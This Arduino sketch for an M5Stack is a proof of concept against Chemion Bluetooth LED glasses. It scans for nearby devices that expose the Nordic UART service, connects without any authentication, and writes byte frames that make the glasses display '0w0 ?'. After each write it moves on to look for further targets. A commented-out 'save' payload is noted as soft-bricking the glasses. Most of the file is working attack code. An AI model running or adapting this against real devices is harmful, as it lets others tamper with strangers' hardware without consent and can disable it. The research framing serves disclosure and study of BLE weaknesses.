/**
 * Chemion POC was bassed off of the BLE client example.
 * found from the M5Stack libary.
 * 
 * BLE Example author: unknown
 * Updated author: chegewara
 * POC author: NotPike
 * Reserchers: Jilles, Jurrejelle, Jurrejelle, Gsuberland, Tnayuki
 * 
 * Licence: All the source code belongs to their respectful owners and their  
 *          licences should be honored, POC code and research is under MIT
 * 
 *                ,▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓███▓▓▓▓▓▌░╣H
 *            ,╓▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░N
 *   -╓╓╓▄╗▄▓▓▓▓▓▀▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌░⌐
 *     `╙▀▀▓▓Ñ░░░░░╣▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▀█▌╙╙▀█▓▓▓▓▓▓▓▓▓▓▓▓▌╛
 *      ,g╫░░░░░╠╣▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌▓██▌ ╙███▓▓▓▓▓▓▓▓▓▓▌
 *    ,╦░░░░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓▓▓█████▌╙╙╙  ╙▓▓▓▓▓▓▓▓┘
 *   ╓▓▄▄▓▓▓▄▄▄▓█▒╫▀▀▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓Ö▀▀▀      ╙▓▓▓▓▓▓▓▓▄╣
 *  ╓▓▓██▓▓▓██░  ▀█▓▓▓▓▓██▓▓▓▓▓█▓▓▓▓▓Ñ\,.   :▓▓▓▓█▓▓▓▓▓▓▓▓▓
 * 4▓▀ ██▓███▌«╨*╖ ▀████▌▓▓▓▓▓█▓▓▓▓▓▓░::»)«¥╗▓██▓▓▓▓▓▓▓▓▓▓▓
 *j╨  ▐██████M`»`╙M══▀▀▀▀█▓▓▓▓▓▓▓█▓▓▓▄▄╤═m══»║▓▓▓▓▓▓▓▓▓▓▓██
 *    "██████▌`»$:½    ,▓▓▓▓▓▓▓█▌▄▄▓█▓▓▓▓▓▓▄M▓▓██▓▓▀▀▀▀███▌
 *    ╣█████▀M╦»Ñ≡╜  ,▄▀╨╢▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌"╓███▓▓▓╔▓û╬Ñ║▌█
 *   ╫██████¿»Ñ║█    └  ▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╩ ▄▓▓██▓Å╔▓▓╫╫╫▌║█
 *  ╦██████╫▓▓███░h▄,,╗▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌``Ö╣▓▓█▓▌▄╫╫╫╫╫╫╫██
 *▄╬█████████████▀╫▌╙▀▀▓▓▀»»╔░░╙▀▓▓▓▓▓Ö,,Æ▀▓█▓█▓█╫▓╫╫╫╫╫███
 *██████████████▌`"▀▄»░░░░░n╠░░░░µ╠╣▀Ö░░░░▓▓█████▓╫╫╫╫▓████
 *█████████████▓▄:▄██▀M≡░░░░░░░░░░░░░░░µ▄▓▓▓████▌╫╫╫╣▓░████
 *████████████▓▓██▓██H»»»╙½╠Tñññ░K╩╨░░»░»║████▓▌╫╫╫▓╨░░║███
 *███████████████▀╫███⌂»»»»»▓▓M░░»»»»░»»»▓█M▓█▌╫╫╫▓▓▄»░████
 *▀▀▀▀╙▀▀▀▀╙╙╙╙▀"^▀▀▀▀╙^`"""▀╙"""""""""""▀""╙"""╙╙╙╙╙""▀▀▀▀
 *
 */

 /*==================== T O D O ==================== */
 /*
  * 0.) Figure out a way to have the glassess save a design
  * 1.) Implement TX_NUS_UUID as a client function that handles Notify services  
  * 2.) Improve scanning before and after init power up
  * 3.) Dissconnect after message is sent, find another target
  * 4.) Test with multiple sets of glasses
  * 5.) Expand project with other BLE devices. :3
  * 
  */
 
#include <M5Stack.h>
#include "banner.h"
#include "BLEDevice.h"

// BLE Services
static BLEUUID NUS_UUID("6E400001-B5A3-F393-E0A9-E50E24DCCA9E"); // UART service UUID
static BLEUUID    RX_NUS_UUID("6E400002-B5A3-F393-E0A9-E50E24DCCA9E"); // UART RX UUID
static BLEUUID    TX_NUS_UUID("6E400003-B5A3-F393-E0A9-E50E24DCCA9E"); // UART TX UUID

// Variables
static boolean doConnect = false;
static boolean connected = false;
static boolean doScan = false;
static BLERemoteCharacteristic* pRemoteCharacteristic;
static BLEAdvertisedDevice* myDevice;



/*==================== L O G I C ==================== */

static void notifyCallback(BLERemoteCharacteristic* pBLERemoteCharacteristic,
                           uint8_t* pData,
                           size_t length,
                           bool isNotify) {
                            
    Serial.print("Notify callback for characteristic ");
    Serial.print(pBLERemoteCharacteristic->getUUID().toString().c_str());
    Serial.print(" of data length ");
    Serial.println(length);
    Serial.print("data: ");
    Serial.println((char*)pData);
}


class MyClientCallback : public BLEClientCallbacks {
  void onConnect(BLEClient* pclient) {
  }

  void onDisconnect(BLEClient* pclient) {
    connected = false;
    Serial.println("onDisconnect");
  }
};


bool connectToServer() {
    Serial.print("Forming a connection to ");
    Serial.println(myDevice->getAddress().toString().c_str());
    
    BLEClient*  pClient  = BLEDevice::createClient();
    Serial.println(" - Created client");

    pClient->setClientCallbacks(new MyClientCallback());

    // Connect to the remove BLE Server.
    pClient->connect(myDevice);  // if you pass BLEAdvertisedDevice instead of address, it will be recognized type of peer device address (public or private)
    Serial.println(" - Connected to server");

    // Obtain a reference to the service we are after in the remote BLE server.
    BLERemoteService* pRemoteService = pClient->getService(NUS_UUID);
    if (pRemoteService == nullptr) {
      Serial.print("Failed to find our service UUID: ");
      Serial.println(NUS_UUID.toString().c_str());
      pClient->disconnect();
      return false;
    }
    Serial.println(" - Found our service");


    // Obtain a reference to the characteristic in the service of the remote BLE server.
    pRemoteCharacteristic = pRemoteService->getCharacteristic(RX_NUS_UUID);
    if (pRemoteCharacteristic == nullptr) {
      Serial.print("Failed to find our characteristic UUID: ");
      Serial.println(RX_NUS_UUID.toString().c_str());
      pClient->disconnect();
      return false;
    }
    Serial.println(" - Found our characteristic");

    // Read the value of the characteristic.
    if(pRemoteCharacteristic->canRead()) {
      std::string value = pRemoteCharacteristic->readValue();
      Serial.print("The characteristic value was: ");
      Serial.println(value.c_str());
    }

    if(pRemoteCharacteristic->canNotify())
      pRemoteCharacteristic->registerForNotify(notifyCallback);

    connected = true;
    return true;
}

//Scan for BLE servers and find the first one that advertises the service we are looking for.
class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
 /**
   * Called for each advertising BLE server.
   */
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    Serial.print("BLE Advertised Device found: ");
    Serial.println(advertisedDevice.toString().c_str());

    // We have found a device, let us now see if it contains the service we are looking for.
    if (advertisedDevice.haveServiceUUID() && advertisedDevice.isAdvertisingService(NUS_UUID)) {

      BLEDevice::getScan()->stop();
      myDevice = new BLEAdvertisedDevice(advertisedDevice);
      doConnect = true;
      doScan = true;

    } // Found our server
  } // onResult
}; // MyAdvertisedDeviceCallbacks

void bleInit() {
  BLEDevice::init("");

  // Retrieve a Scanner and set the callback we want to use to be informed when we
  // have detected a new device.  Specify that we want active scanning and start the
  // scan to run for 5 seconds.
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setInterval(1349);
  pBLEScan->setWindow(449);
  pBLEScan->setActiveScan(true);
  pBLEScan->start(5, false);
}

void screenInit() {
   // Banner 
  M5.Lcd.setBrightness(0);
  M5.Lcd.pushImage(0, 0, 320, 240, banner);

  // Fade in
  int i;
  for(i = 0; i <= 255; i++) {
    M5.Lcd.setBrightness(i);
    delay(2);
  }

  // Fade middle
  for(i = 255; i >= 100; i--) {
    M5.Lcd.setBrightness(i);
    delay(2);
  }

  // Pause for dramatic effect
  delay(3000);

  // Fade out
  for(i = 100; i >= 0; i--) {
    M5.Lcd.setBrightness(i);
    delay(2);
  }

  M5.Lcd.setBrightness(100);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextColor(WHITE);
  M5.Lcd.setTextSize(2);
  Serial.println("Starting Chemion POC...");
  M5.Lcd.printf(">>> Starting Chemion POC\n"); 
}


/*==================== S E T U P ==================== */
void setup() {
  M5.begin();
  Serial.begin(115200);

  screenInit();
  bleInit();
} 


/*==================== M A I N   L O O P ==================== */
void loop() {

  // If the flag "doConnect" is true then we have scanned for and found the desired
  // BLE Server with which we wish to connect.  Now we connect to it.  Once we are 
  // connected we set the connected flag to be true.
  if (doConnect == true) {
    if (connectToServer()) {
      Serial.printf("Connected to %s.\n",myDevice->getName().c_str());
      M5.Lcd.printf(">>> Connect: %s\n",myDevice->getName().c_str());
    } else {
      Serial.println("We have failed to connect to the server; there is nothin more we will do.");
      M5.Lcd.printf(">>> We have failed to connect to the server; there is nothin more we will do.\n");
    }
    doConnect = false;
  }


  // If we are connected to a peer BLE Server, update the characteristic each time we are reached
  // with the current time since boot.
  if (connected) {
    
    // Static Display "0w0 ?"
    uint8_t msg_static[4][20] = {{0xfa,0x03,0x00,0x39,0x01,0x00,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x00,0x00,0x3c,0x00,0x3c,0xf3},
                                 {0x00,0x00,0xf3,0x00,0xc3,0xf3,0x3c,0x0c,0xf3,0x00,0xc3,0xf3,0x3c,0xcc,0xf3,0x00,0x0c,0xf3,0x3c,0xcc},
                                 {0xf3,0x00,0x0c,0xf3,0x3c,0xcc,0xf3,0x00,0x00,0x3c,0x0f,0x30,0x3c,0x00,0x0c,0x00,0x00,0x00,0x00,0x00},
                                 {0x00, 0xc8, 0x55, 0xa9}};
   
    // Save "0w0 ?" to slot 5
    // This soft bricks the glasses when sent... >_<    
    uint8_t msg_save[8][20] = {{0xfa,0x01,0x00,0x03,0x01,0x00,0x05,0x04,0x55,0xa9},
                              {0xfa,0x01,0x00,0x04,0x01,0x00,0x14,0x05,0x10,0x55,0xa9},
                              {0xfa,0x01,0x00,0x06,0x01,0x00,0x0b,0x05,0x00,0x01,0x0e,0x55,0xa9},
                              {0xfa,0x01,0x00,0x3b,0x01,0x00,0x0d,0x01,0x0a,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x00,0x00,0x3c,0x00},
                              {0x3c,0xf3,0x00,0x00,0xf3,0x00,0xc3,0xf3,0x3c,0x0c,0xf3,0x00,0xc3,0xf3,0x3c,0xcc,0xf3,0x00,0x0c,0xf3},
                              {0x3c,0xcc,0xf3,0x00,0x0c,0xf3,0x3c,0xcc,0xf3,0x00,0x00,0x3c,0x0f,0x30,0x3c,0x00,0x0c,0x00,0x00,0x00},
                              {0x00,0x00,0x00,0xc8,0x55,0xa9},
                              {0xfa,0x01,0x00,0x03,0x01,0x00,0x0c,0x0d,0x55,0xa9}};            
    
    Serial.printf("Updating Glasses 0w0\n");
    M5.Lcd.printf(">>> Updating Glasses 0w0\n");
        
    // Send msg_save
    // Device fails when sent
//    int i;
//    for(i = 0; i < 8; i++) {
//      pRemoteCharacteristic->writeValue(msg_save[i], (sizeof(msg_save[i]) / sizeof(*msg_save[i])) );
//    }

    // Send msg_static
    int i;
    for(i = 0; i < 4; i++) {
      pRemoteCharacteristic->writeValue(msg_static[i], (sizeof(msg_static[i]) / sizeof(*msg_static[i])) );
    }

    // Disconnect
    doConnect = false;
    connected = false;
    doScan = true;
    
    //bleInit();
    
  }else if(doScan){
    BLEDevice::getScan()->start(0);  // this is just eample to start scan after disconnect, most likely there is better way to do it in arduino
  }
  delay(1000); 
} 
